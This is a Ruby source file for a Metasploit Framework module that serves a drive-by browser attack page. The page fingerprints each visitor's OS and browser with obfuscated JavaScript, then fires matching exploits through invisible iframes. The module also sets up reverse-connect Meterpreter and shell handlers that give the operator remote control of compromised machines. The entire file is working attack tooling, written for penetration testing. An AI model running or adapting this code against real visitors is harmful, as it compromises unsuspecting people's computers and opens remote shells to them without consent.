##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

# ideas:
#	- add a loading page option so the user can specify arbitrary html to
#	  insert all of the evil js and iframes into
#	- caching is busted when different browsers come from the same IP

require 'msf/core'
require 'rex/exploitation/javascriptosdetect'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'HTTP Client Automatic Exploiter',
			'Version'     => '$Revision$',
			'Description' => %q{
					This module uses a combination of client-side and server-side
				techniques to fingerprint HTTP clients and then automatically
				exploit them.
			},
			'Author'      =>
				[
					# initial concept, integration and extension of Jerome
					# Athias' os_detect.js
					'egypt',
				],
			'License'     => BSD_LICENSE,
			'Actions'     =>
				[
					[ 'WebServer', {
						'Description' => 'Start a bunch of modules and direct clients to appropriate exploits'
					} ],
					[ 'DefangedDetection', {
						'Description' => 'Only perform detection, send no exploits'
					} ],
					[ 'list', {
						'Description' => 'List the exploit modules that would be started'
					} ]
				],
			'PassiveActions' =>
				[ 'WebServer', 'DefangedDetection' ],
			'DefaultAction'  => 'WebServer'))

		register_options([
			OptAddress.new('LHOST', [true,
				'The IP address to use for reverse-connect payloads'
			]),
		], self.class)

		register_advanced_options([
			# We know that most of these exploits will crash the browser, so
			# set the default to run migrate right away if possible.
			OptString.new('InitialAutoRunScript', [false, "An initial script to run on session created (before AutoRunScript)",  'migrate -f']),
			OptString.new('AutoRunScript', [false, "A script to automatically on session creation.", '']),
			OptBool.new('AutoSystemInfo', [true, "Automatically capture system information on initialization.", true]),
			OptString.new('MATCH', [false,
				'Only attempt to use exploits whose name matches this regex'
			]),
			OptString.new('EXCLUDE', [false,
				'Only attempt to use exploits whose name DOES NOT match this regex'
			]),
			OptBool.new('DEBUG', [false,
				'Do not obfuscate the javascript and print various bits of useful info to the browser',
				false
			]),
			OptPort.new('LPORT_WIN32', [false,
				'The port to use for Windows reverse-connect payloads', 3333
			]),
			OptString.new('PAYLOAD_WIN32', [false,
				'The payload to use for Windows reverse-connect payloads',
				'windows/meterpreter/reverse_tcp'
			]),
			OptPort.new('LPORT_LINUX', [false,
				'The port to use for Linux reverse-connect payloads', 4444
			]),
			OptString.new('PAYLOAD_LINUX', [false,
				'The payload to use for Linux reverse-connect payloads',
				'linux/meterpreter/reverse_tcp'
			]),
			OptPort.new('LPORT_MACOS', [false,
				'The port to use for Mac reverse-connect payloads', 5555
			]),
			OptString.new('PAYLOAD_MACOS', [false,
				'The payload to use for Mac reverse-connect payloads',
				'osx/meterpreter/reverse_tcp'
			]),
			OptPort.new('LPORT_GENERIC', [false,
				'The port to use for generic reverse-connect payloads', 6666
			]),
			OptString.new('PAYLOAD_GENERIC', [false,
				'The payload to use for generic reverse-connect payloads6',
				'generic/shell_reverse_tcp'
			]),
			OptPort.new('LPORT_JAVA', [false,
				'The port to use for Java reverse-connect payloads', 7777
			]),
			OptString.new('PAYLOAD_JAVA', [false,
				'The payload to use for Java reverse-connect payloads',
				'java/meterpreter/reverse_tcp'
			]),
		], self.class)

		@exploits = Hash.new
		@payloads = Hash.new
		@targetcache = Hash.new
		@current_victim = Hash.new
		@handler_job_ids = []
	end


	def run
		if (action.name == 'list')
			m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
			e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
			framework.exploits.each_module do |name, mod|
				if (mod.respond_to?("autopwn_opts") and name =~ m_regex and name !~ e_regex)
					@exploits[name] = nil
					print_line name
				end
			end
			print_line
			print_status("Found #{@exploits.length} exploit modules")
		elsif (action.name == 'DefangedDetection')
			exploit()
		else
			start_exploit_modules()
			if @exploits.length < 1
				print_error("No exploits, check your MATCH and EXCLUDE settings")
				return false
			end
			exploit()
		end
	end


	def setup

		@init_js = ::Rex::Exploitation::ObfuscateJS.new
		@init_js << <<-ENDJS

			#{js_os_detect}
			#{js_base64}

			function make_xhr() {
				var xhr;
				try {
					xhr = new XMLHttpRequest();
				} catch(e) {
					try {
						xhr = new ActiveXObject("Microsoft.XMLHTTP");
					} catch(e) {
						xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
					}
				}
				if (! xhr) {
					throw "failed to create XMLHttpRequest";
				}
				return xhr;
			}

			function report_and_get_exploits(detected_version) {
				var encoded_detection;
				xhr = make_xhr();
				xhr.onreadystatechange = function () {
					if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
						eval(xhr.responseText);
					}
				};

				encoded_detection = new String();
				#{js_debug('navigator.userAgent+"<br><br>"')}
				for (var prop in detected_version) {
					#{js_debug('prop + " " + detected_version[prop] +"<br>"')}
					encoded_detection += detected_version[prop] + ":";
				}
				//#{js_debug('encoded_detection + "<br>"')}
				encoded_detection = Base64.encode(encoded_detection);
				xhr.open("GET", document.location + "?sessid=" + encoded_detection);
				xhr.send(null);
			}

			function bodyOnLoad() {
				var detected_version = getVersion();
				//#{js_debug('detected_version')}
				report_and_get_exploits(detected_version);
			} // function bodyOnLoad
		ENDJS

		opts = {
			'Symbols' => {
				'Variables'   => [
					'xhr',
					'encoded_detection',
				],
				'Methods'   => [
					'report_and_get_exploits',
					'handler',
					'bodyOnLoad',
				]
			},
			'Strings' => true,
		}

		@init_js.update_opts(opts)
		@init_js.update_opts(js_os_detect.opts)
		@init_js.update_opts(js_base64.opts)
		if (datastore['DEBUG'])
			print_status("Adding debug code")
			@init_js << <<-ENDJS
				if (!(typeof(debug) == 'function')) {
					function htmlentities(str) {
						str = str.replace(/>/g, '&gt;');
						str = str.replace(/</g, '&lt;');
						str = str.replace(/&/g, '&amp;');
						return str;
					}
					function debug(msg) {
						document.body.innerHTML += (msg + "<br />\\n");
					}
				}
			ENDJS
		else
			@init_js.obfuscate()
		end

		#@init_js << "window.onload = #{@init_js.sym("bodyOnLoad")};";
		@init_html  = %Q|<html > <head > <title > Loading </title>\n|
		@init_html << %Q|<script language="javascript" type="text/javascript">|
		@init_html << %Q|<!-- \n #{@init_js} //-->|
		@init_html << %Q|</script> </head> |
		@init_html << %Q|<body onload="#{@init_js.sym("bodyOnLoad")}()"> |
		@init_html << %Q|<noscript> \n|
		# Don't use build_iframe here because it will break detection in
		# DefangedDetection mode when the target has js disabled.
		@init_html << %Q|<iframe src="#{self.get_resource}?ns=1"></iframe>|
		@init_html << %Q|</noscript> \n|
		@init_html << %Q|</body> </html> |

		#
		# I'm still not sold that this is the best way to do this, but random
		# LPORTs causes confusion when things break and breakage when firewalls
		# are in the way.  I think the ideal solution is to have
		# self-identifying payloads so we'd only need 1 LPORT for multiple
		# stagers.
		#
		@win_lport  = datastore['LPORT_WIN32']
		@win_payload  = datastore['PAYLOAD_WIN32']
		@lin_lport  = datastore['LPORT_LINUX']
		@lin_payload  = datastore['PAYLOAD_LINUX']
		@osx_lport  = datastore['LPORT_MACOS']
		@osx_payload  = datastore['PAYLOAD_MACOS']
		@gen_lport  = datastore['LPORT_GENERIC']
		@gen_payload  = datastore['PAYLOAD_GENERIC']
		@java_lport = datastore['LPORT_JAVA']
		@java_payload = datastore['PAYLOAD_JAVA']

		minrank = framework.datastore['MinimumRank'] || 'manual'
		if not RankingName.values.include?(minrank)
			print_error("MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join("|")})")
			wlog("MinimumRank invalid, ignoring", 'core', LEV_0)
		end
		@minrank = RankingName.invert[minrank]

	end


	def init_exploit(name, mod = nil, targ = 0)
		if mod.nil?
			@exploits[name] = framework.modules.create(name)
		else
			@exploits[name] = mod.new
		end
		apo = @exploits[name].class.autopwn_opts
		if (apo[:rank] < @minrank)
			@exploits.delete(name)
			return false
		end

		case name
		when %r{windows}
			payload = @win_payload
			lport = @win_lport
=begin
		#
		# Some day, we'll support Linux and Mac OS X here.. 
		#

		when %r{linux}
			payload = @lin_payload
			lport = @lin_lport

		when %r{osx}
			payload = @osx_payload
			lport = @osx_lport
=end

		# We need to check that it's /java_ instead of just java since it would
		# clash with things like mozilla_navigatorjava.  Better would be to
		# check the actual platform of the module here but i'm lazy.
		when %r{/java_}
			payload = @java_payload
			lport = @java_lport
		else
			payload = @gen_payload
			lport = @gen_lport
		end
		@payloads[lport] = payload

		print_status("Starting exploit #{name} with payload #{payload}")
		@exploits[name].datastore['SRVHOST'] = datastore['SRVHOST']
		@exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']

		# For testing, set the exploit uri to the name of the exploit so it's
		# easy to tell what is happening from the browser.
		if (datastore['DEBUG'])
			@exploits[name].datastore['URIPATH'] = name
		else
			@exploits[name].datastore['URIPATH'] = nil
		end

		@exploits[name].datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
		@exploits[name].datastore['MODULE_OWNER'] = self.owner
		@exploits[name].datastore['ParentUUID'] = datastore["ParentUUID"] if datastore["ParentUUID"]
		@exploits[name].datastore['AutopwnUUID'] = self.uuid
		@exploits[name].datastore['LPORT'] = lport
		@exploits[name].datastore['LHOST'] = @lhost
		@exploits[name].datastore['SSL'] = datastore['SSL']
		@exploits[name].datastore['SSLVersion'] = datastore['SSLVersion']
		@exploits[name].datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
		@exploits[name].datastore['DisablePayloadHandler'] = true
		@exploits[name].exploit_simple(
			'LocalInput'     => self.user_input,
			'LocalOutput'    => self.user_output,
			'Target'         => targ,
			'Payload'        => payload,
			'RunAsJob'       => true)

		# It takes a little time for the resources to get set up, so sleep for
		# a bit to make sure the exploit is fully working.  Without this,
		# mod.get_resource doesn't exist when we need it.
		Rex::ThreadSafe.sleep(0.5)

		# Make sure this exploit got set up correctly, return false if it
		# didn't
		if framework.jobs[@exploits[name].job_id.to_s].nil?
			print_error("Failed to start exploit module #{name}")
			@exploits.delete(name)
			return false
		end

		# Since r9714 or so, exploit_simple copies the module instead of
		# operating on it directly when creating a job.  Put the new copy into
		# our list of running exploits so we have access to its state.  This
		# allows us to get the correct URI for each exploit in the same manor
		# as before, using mod.get_resource().
		@exploits[name] = framework.jobs[@exploits[name].job_id.to_s].ctx[0]

		return true
	end


	def start_exploit_modules()
		@lhost = (datastore['LHOST'] || "0.0.0.0")

		@js_tests = {}
		@noscript_tests = {}

		print_line
		print_status("Starting exploit modules on host #{@lhost}...")
		print_status("---")
		print_line
		m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
		e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
		framework.exploits.each_module do |name, mod|
			if (mod.respond_to?("autopwn_opts") and name =~ m_regex and name !~ e_regex)
				next if !(init_exploit(name))
				apo = mod.autopwn_opts.dup
				apo[:name] = name.dup
				apo[:vuln_test] ||= ""

				if apo[:classid]
					# Then this is an IE exploit that uses an ActiveX control,
					# build the appropriate tests for it.
					method = apo[:vuln_test].dup
					apo[:vuln_test] = ""
					apo[:ua_name] = HttpClients::IE
					if apo[:classid].kind_of?(Array)  # then it's many classids
						apo[:classid].each { |clsid|
							apo[:vuln_test] << "if (testAXO('#{clsid}', '#{method}')) {\n"
							apo[:vuln_test] << " is_vuln = true;\n"
							apo[:vuln_test] << "}\n"
						}
					else
						apo[:vuln_test] << "if (testAXO('#{apo[:classid]}', '#{method}')) {\n"
						apo[:vuln_test] << " is_vuln = true;\n"
						apo[:vuln_test] << "}\n"
					end
				end

				if apo[:ua_minver] and apo[:ua_maxver]
					ver_test =
							"!ua_ver_lt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_minver]}') && " +
							"!ua_ver_gt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_maxver]}')"
				elsif apo[:ua_minver]
					ver_test = "!ua_ver_lt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_minver]}')\n"
				elsif apo[:ua_maxver]
					ver_test = "!ua_ver_gt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_maxver]}')\n"
				else
					ver_test = "true"
				end
				test =  "if (#{ver_test}) { "
				test << (apo[:vuln_test].empty? ? "is_vuln = true;" : apo[:vuln_test])
				test << "} else { is_vuln = false; }\n"
				apo[:vuln_test] = test

				# Now that we've got all of our exploit tests put together,
				# organize them into requires-scripting and
				# doesnt-require-scripting, sorted by browser name.
				if apo[:javascript] && apo[:ua_name]
					@js_tests[apo[:ua_name]] ||= []
					@js_tests[apo[:ua_name]].push(apo)
				elsif apo[:javascript]
					@js_tests["generic"] ||= []
					@js_tests["generic"].push(apo)
				elsif apo[:ua_name]
					@noscript_tests[apo[:ua_name]] ||= []
					@noscript_tests[apo[:ua_name]].push(apo)
				else
					@noscript_tests["generic"] ||= []
					@noscript_tests["generic"].push(apo)
				end
			end
		end
		# start handlers for each type of payload
		[@win_lport, @lin_lport, @osx_lport, @gen_lport, @java_lport].each do |lport|
			if (lport and @payloads[lport])
				print_status("Starting handler for #{@payloads[lport]} on port #{lport}")
				multihandler = framework.modules.create("exploit/multi/handler")
				multihandler.datastore['MODULE_OWNER'] = self.datastore['MODULE_OWNER']
				multihandler.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
				multihandler.datastore['ParentUUID'] = datastore["ParentUUID"] if datastore["ParentUUID"]
				multihandler.datastore['AutopwnUUID'] = self.uuid
				multihandler.datastore['LPORT'] = lport
				multihandler.datastore['LHOST'] = @lhost
				multihandler.datastore['ExitOnSession'] = false
				multihandler.datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
				multihandler.datastore["ReverseListenerBindAddress"] = datastore["ReverseListenerBindAddress"]
				# XXX: Revisit this when we have meterpreter working on more than just windows
				if (lport == @win_lport)
					multihandler.datastore['AutoRunScript'] = datastore['AutoRunScript']
					multihandler.datastore['AutoSystemInfo'] = datastore['AutoSystemInfo']
					multihandler.datastore['InitialAutoRunScript'] = datastore['InitialAutoRunScript']
				end
				multihandler.exploit_simple(
					'LocalInput'     => self.user_input,
					'LocalOutput'    => self.user_output,
					'Payload'        => @payloads[lport],
					'RunAsJob'       => true)
				@handler_job_ids.push(multihandler.job_id)
			end
		end
		# let the handlers get set up
		Rex::ThreadSafe.sleep(0.5)

		print_line
		print_status("--- Done, found %bld%grn#{@exploits.length}%clr exploit modules")
		print_line

		# Sort the tests by reliability, descending.
		@js_tests.each { |browser,tests|
			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
		}

		@noscript_tests.each { |browser,tests|
			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
		}

	end

	def on_request_uri(cli, request)
		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")

		case request.uri
		when self.get_resource
			# This is the first request.  Send the javascript fingerprinter and
			# hope it sends us back some data.  If it doesn't, javascript is
			# disabled on the client and we will have to do a lot more
			# guessing.
			response = create_response()
			response["Expires"] = "0"
			response["Cache-Control"] = "must-revalidate"
			response.body = @init_html
			cli.send_response(response)
		when %r{^#{self.get_resource}.*sessid=}
			# This is the request for the exploit page when javascript is
			# enabled.  Includes the results of the javascript fingerprinting
			# in the "sessid" parameter as a base64 encoded string.
			record_detection(cli, request)
			if (action.name == "DefangedDetection")
				response = create_response()
				response.body = "Please wait"
			else
				print_status("Responding with exploits")
				response = build_script_response(cli, request)
			end

			cli.send_response(response)
		when %r{^#{self.get_resource}.*ns=1}
			# This is the request for the exploit page when javascript is NOT
			# enabled.  Since scripting is disabled, fall back to useragent
			# detection, which is kind of a bummer since it's so easy for the
			# ua string to lie.  It probably doesn't matter that much because
			# most of our exploits require javascript anyway.
			print_status("Browser has javascript disabled, trying exploits that don't need it")
			record_detection(cli, request)
			if (action.name == "DefangedDetection")
				response = create_response()
				response.body = "Please wait"
			else
				print_status("Responding with non-javascript exploits")
				response = build_noscript_response(cli, request)
			end

			response["Expires"] = "0"
			response["Cache-Control"] = "must-revalidate"
			cli.send_response(response)
		else
			print_status("404ing #{request.uri}")
			send_not_found(cli)
			return false
		end
	end

	def build_noscript_html(cli, request)
		client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent'])
		body = ""

		@noscript_tests.each { |browser, sploits|
			next if sploits.length == 0

			# If client_info is nil then get_client failed and we have no
			# knowledge of this client, so we can't assume anything about their
			# browser.  If the exploit does not specify a browser target, that
			# means it it is generic and will work anywhere (or at least be
			# able to autodetect).  If the currently connected client's ua_name
			# is nil, then the fingerprinting didn't work for some reason.
			# Lastly, check to see if the client's browser matches the browser
			# targetted by this group of exploits. In all of these cases, we
			# need to send all the exploits in the list.
			if not(client_info && browser && [nil, browser].include?(client_info[:ua_name]))
				if (HttpClients::IE == browser)
					body << "<!--[if IE]>\n"
				end
				sploits.map do |s|
					body << (s[:prefix_html] || "") + "\n"
					body << build_iframe(exploit_resource(s[:name])) + "\n"
					body << (s[:postfix_html] || "") + "\n"
				end
				if (HttpClients::IE == browser)
					body << "<![endif]-->\n"
				end
			end
		}
		body
	end

	def build_noscript_response(cli, request)

		response = create_response()
		response['Expires'] = '0'
		response['Cache-Control'] = 'must-revalidate'

		response.body  = "<html > <head > <title > Loading </title> </head> "
		response.body << "<body> "
		response.body << "Please wait "
		response.body << build_noscript_html(cli, request)
		response.body << "</body> </html> "

		return response
	end

	def build_script_response(cli, request)
		response = create_response()
		response['Expires'] = '0'
		response['Cache-Control'] = 'must-revalidate'

		host_info   = get_host(:host => cli.peerhost)
		client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent'])
		#print_status("Client info: #{client_info.inspect}")

		js = ::Rex::Exploitation::ObfuscateJS.new
		# If we didn't get a client from the database, then the detection
		# is borked or the db is not connected, so fallback to sending
		# some IE-specific stuff with everything.  Do the same if the
		# exploit didn't specify a client.  Otherwise, make sure this is
		# IE before sending code for ActiveX checks.
		if (client_info.nil? || [nil, HttpClients::IE].include?(client_info[:ua_name]))
			# If we have a class name (e.g.: "DirectAnimation.PathControl"),
			# use the simple and direct "new ActiveXObject()".  If we
			# have a classid instead, first try creating the object
			# with createElement("object").  However, some things
			# don't like being created this way (specifically winzip),
			# so try writing out an object tag as well.  One of these
			# two methods should succeed if the object with the given
			# classid can be created.
			js << <<-ENDJS
				function testAXO(axo_name, method) {
					if (axo_name.substring(0,1) == String.fromCharCode(123)) {
						axobj = document.createElement("object");
						axobj.setAttribute("classid", "clsid:" + axo_name);
						axobj.setAttribute("id", axo_name);
						axobj.setAttribute("style", "visibility: hidden");
						axobj.setAttribute("width", "0px");
						axobj.setAttribute("height", "0px");
						document.body.appendChild(axobj);
						if (typeof(axobj[method]) == 'undefined') {
							var attributes = 'id="' + axo_name + '"';
							attributes += ' classid="clsid:' + axo_name + '"';
							attributes += ' style="visibility: hidden"';
							attributes += ' width="0px" height="0px"';
							document.body.innerHTML += "<object " + attributes + "></object>";
							axobj = document.getElementById(axo_name);
						}
					} else {
						try {
							axobj = new ActiveXObject(axo_name);
						} catch(e) {
							axobj = '';
						};
					}
					#{js_debug('axo_name + "." + method + " = " + typeof axobj[method] + "<br/>"')}
					if (typeof(axobj[method]) != 'undefined') {
						return true;
					}
					return false;
				}
			ENDJS
			# End of IE-specific test functions
		end
		# Generic stuff that is needed regardless of what browser was detected.
		js << <<-ENDJS
			var written_iframes = new Array();
			function write_iframe(myframe) {
				var iframe_idx; var mybody;
				for (iframe_idx in written_iframes) {
					if (written_iframes[iframe_idx] == myframe) {
						return;
					}
				}
				written_iframes[written_iframes.length] = myframe;
				str = '';
				str += '<iframe src="' + myframe + '" style="visibility:hidden" height="0" width="0" border="0"></iframe>';
				#{datastore['DEBUG'] ? "str += '<p>' + myframe + '</p>'" : ""};
				document.body.innerHTML += (str);
			}
			var global_exploit_list = [];
			function next_exploit(exploit_idx) {
				if (!global_exploit_list[exploit_idx]) {
					return;
				}
				// Wrap all of the vuln tests in a try-catch block so a
				// single borked test doesn't prevent other exploits
				// from working.
				try {
					var test = global_exploit_list[exploit_idx].test;
					if (!test) {
						test = "true";
					} else {
						test = "try {" + test + "} catch (e) { is_vuln = false; }; is_vuln";
					}
					//alert("next_exploit(" + (exploit_idx).toString() + ") => " +
					//	global_exploit_list[exploit_idx].resource + "\\n" +
					//	test + " -- " + eval(test)
					//);
					if (eval(test)) {
						write_iframe(global_exploit_list[exploit_idx].resource);
						setTimeout("next_exploit(" + (exploit_idx+1).toString() + ")", 1000);
					} else {
						#{js_debug("'this client does not appear to be vulnerable to ' + global_exploit_list[exploit_idx].resource + '<br>'")}
						next_exploit(exploit_idx+1);
					}
				} catch(e) {
					next_exploit(exploit_idx+1);
				};
			}
		ENDJS
		opts = {
			'Symbols' => {
				'Variables'   => [
					'written_iframes',
					'myframe',
					'mybody',
					'iframe_idx',
					'is_vuln',
					'global_exploit_list',
					'exploit_idx',
				],
				'Methods'   => [
					'write_iframe',
					'next_exploit',
				]
			},
			'Strings' => true,
		}

		@js_tests.each { |browser, sploits|
			next if sploits.length == 0
			if (client_info.nil? || [nil, browser, "generic"].include?(client_info[:ua_name]))
				# Make sure the browser names can be used as an identifier in
				# case something wacky happens to them.
				func_name = "exploit#{browser.gsub(/[^a-zA-Z]/, '')}"
				js << "function #{func_name}() { \n"
				sploits.map do |s|
					# get rid of newlines and escape quotes
					test = s[:vuln_test].gsub("\n",'').gsub("'", "\\\\'")
					# shouldn't be any in the resource, but just in case...
					res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")

					# Skip exploits that don't match the client's OS.
					if (host_info and host_info[:os_name] and s[:os_name])
						next unless s[:os_name].include?(host_info[:os_name])
					end
					js << " global_exploit_list[global_exploit_list.length] = {\n"
					if test and not test.empty?
						js << "  'test':'#{test}',\n"
					else
						js << "  'test':'is_vuln = true;',\n"
					end
					js << "  'resource':'#{res}'\n"
					js << " };\n"
				end
				js << "};\n" # end function exploit...()
				js << "#{js_debug("'exploit func: #{func_name}()<br>'")}\n"
				js << "#{func_name}();\n" # run that bad boy
				opts['Symbols']['Methods'].push("#{func_name}")
			end
		}
		js << %q|var noscript_exploits = "|
		js << Rex::Text.to_hex(build_noscript_html(cli, request), "%")
		js << %q|";|
		js << %q|noscript_div = document.createElement("div");|
		js << %q|noscript_div.innerHTML = unescape(noscript_exploits);|
		js << %q|document.body.appendChild(noscript_div);|

		#js << %q|document.write("<div>" + noscript_exploits);|
		opts['Symbols']['Methods'].push("noscript_exploits")
		opts['Symbols']['Methods'].push("noscript_div")
		js << "#{js_debug("'starting exploits<br>'")}\n"
		js << "next_exploit(0);\n"

		if not datastore['DEBUG']
			js.obfuscate
		end
		response.body = "#{js}"

		return response
	end

	# consider abstracting this out to a method (probably
	# with a different name) of Msf::Auxiliary::Report or
	# Msf::Exploit::Remote::HttpServer
	def record_detection(cli, request)
		os_name = nil
		os_flavor = nil
		os_sp = nil
		os_lang = nil
		arch = nil
		ua_name = nil
		ua_ver = nil

		data_offset = request.uri.index('sessid=')
		#p request['User-Agent']
		if (data_offset.nil? or -1 == data_offset)
			# then we didn't get a report back from our javascript
			# detection; make a best guess effort from information
			# in the user agent string.  The OS detection should be
			# roughly the same as the javascript version on non-IE
			# browsers because it does most everything with
			# navigator.userAgent
			print_status("Recording detection from User-Agent: #{request['User-Agent']}")
			report_user_agent(cli.peerhost, request)
		else
			data_offset += 'sessid='.length
			detected_version = request.uri[data_offset, request.uri.length]
			if (0 < detected_version.length)
				detected_version = Rex::Text.decode_base64(Rex::Text.uri_decode(detected_version))
				print_status("JavaScript Report: #{detected_version}")
				(os_name, os_flavor, os_sp, os_lang, arch, ua_name, ua_ver) = detected_version.split(':')

				if framework.db.active
					host_info = { :host => cli.peerhost }
					host_info[:os_name]   = os_name   if os_name != "undefined"
					host_info[:os_flavor] = os_flavor if os_flavor != "undefined"
					host_info[:os_sp]     = os_sp     if os_sp != "undefined"
					host_info[:os_lang]   = os_lang   if os_lang != "undefined"
					host_info[:arch]      = arch      if arch != "undefined"

					report_host(host_info)
					client_info = ({
						:host      => cli.peerhost,
						:ua_string => request['User-Agent'],
						:ua_name   => ua_name,
						:ua_ver    => ua_ver
					})
					report_client(client_info)
				end
			end
		end

		# Always populate the target cache since querying the database is too
		# slow for real-time.
		key = cli.peerhost + request['User-Agent']
		@targetcache ||= {}
		@targetcache[key] ||= {}
		@targetcache[key][:updated_at] = Time.now.to_i

		# Clean the cache
		rmq = []
		@targetcache.each_key do |addr|
			if (Time.now.to_i > @targetcache[addr][:updated_at]+60)
				rmq.push addr
			end
		end
		rmq.each {|addr| @targetcache.delete(addr) }

		# Keep the attributes the same as if it were created in
		# the database.
		@targetcache[key][:updated_at] = Time.now.to_i
		@targetcache[key][:ua_string] = request['User-Agent']
		@targetcache[key][:ua_name] = ua_name
		@targetcache[key][:ua_ver] = ua_ver
	end

	# Override super#get_client to use a cache since the database is generally
	# too slow to be useful for realtime tasks.  This essentially creates an
	# in-memory database.  The upside is that it works if the database is
	# broken (which seems to be all the time now).
	def get_client(opts)
		host = opts[:host]
		return @targetcache[opts[:host]+opts[:ua_string]]
	end

	def build_iframe(resource)
		ret = ''
		if (action.name == 'DefangedDetection')
			ret << "<p>iframe #{resource}</p>"
		else
			ret << %Q|<iframe src="#{resource}" style="visibility:hidden" height="0" width="0" border="0"></iframe>|
			#ret << %Q|<iframe src="#{resource}" ></iframe>|
		end
		return ret
	end

	def exploit_resource(name)
		if (@exploits[name] && @exploits[name].respond_to?("get_resource"))
			#print_line("Returning #{@exploits[name].get_resource.inspect}, for #{name}")
			return @exploits[name].get_resource
		else
			print_error("Don't have an exploit by that name, returning 404#{name}.html")
			return "404#{name}.html"
		end
	end

	def js_debug(msg)
		if datastore['DEBUG']
			return "document.body.innerHTML += #{msg};"
		end
		return ""
	end

	def cleanup
		print_status("Cleaning up exploits...")
		@exploits.each_pair do |name, mod|
			framework.jobs[mod.job_id.to_s].stop if framework.jobs[mod.job_id.to_s]
		end
		@handler_job_ids.each do |id|
			framework.jobs[id.to_s].stop if framework.jobs[id.to_s]
		end
		super
	end

end

